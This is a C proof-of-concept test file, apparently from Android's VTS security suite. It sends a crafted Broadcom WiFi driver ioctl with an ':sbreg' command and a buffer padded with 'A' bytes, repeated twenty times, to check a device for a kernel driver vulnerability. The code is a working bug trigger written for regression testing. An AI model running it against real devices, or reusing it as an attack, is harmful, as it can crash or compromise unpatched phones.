/*
 * Copyright (C) 2016 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include "poc_test.h"

#include <dlfcn.h>
#include <errno.h>
#include <fcntl.h>
#include <net/if.h>
#include <sys/socket.h>
#include <linux/fb.h>
#include <linux/wireless.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define BUF_LEN 8192
#define IOC_BUF_LEN 63
#define TEST_CNT 20

typedef struct _android_wifi_priv_cmd {
  char *buf;
  int used_len;
  int total_len;
} android_wifi_priv_cmd;

typedef struct sdreg {
  int func;
  int offset;
  int value;
} sdreg_t;

typedef struct dhd_ioctl {
  uint cmd;          /* common ioctl definition */
  void *buf;         /* pointer to user buffer */
  uint len;          /* length of user buffer */
  unsigned char set; /* get or set request (optional) */
  uint used;         /* bytes read or written (optional) */
  uint needed;       /* bytes needed (optional) */
  uint driver;       /* to identify target driver */
} dhd_ioctl_t;

int poc(const char *ifname) {
  int fd, i, res;
  dhd_ioctl_t ioc;
  struct ifreq arg;
  struct iwreq data;
  struct sdreg *s;
  android_wifi_priv_cmd priv_cmd;
  char buf[BUF_LEN];
  char iocbuf[IOC_BUF_LEN];

  fd = socket(AF_INET, SOCK_STREAM, 0);
  if (fd < 0) {
    printf("open socket error : fd:0x%x  %s \n", fd, strerror(errno));
    return POC_TEST_FAIL;
  }
  memcpy(arg.ifr_ifrn.ifrn_name, ifname, strlen(ifname));

  memset(iocbuf, 0x41, IOC_BUF_LEN);
  memcpy(iocbuf, ":sbreg\0", 7);

  s = (struct sdreg *)&(iocbuf[7]);
  s->func = 1;
  ioc.len = IOC_BUF_LEN;
  ioc.buf = iocbuf;
  ioc.driver = 0x00444944;
  ioc.cmd = 0x2;

  arg.ifr_data = &ioc;

  for (i = 0; i < 1; i++) {
    if ((res = ioctl(fd, 0x89F0, (struct ifreq *)&arg)) < 0) {
      printf("ioctl error res:0x%x, %s \r\n", res, strerror(errno));
    }
    sleep(1);
  }
  close(fd);
  return POC_TEST_PASS;
}

int main(int argc, char **argv) {
  VtsHostInput host_input = ParseVtsHostFlags(argc, argv);
  const char *ifname = host_input.params["ifname"].c_str();
  if (strlen(ifname) == 0) {
    fprintf(stderr, "ifname parameter is empty.\n");
    return POC_TEST_FAIL;
  }

  int i, ret;

  for (i = 0; i < TEST_CNT; i++) {
    if ((ret = poc(ifname)) != POC_TEST_PASS) break;
  }

  return ret;
}
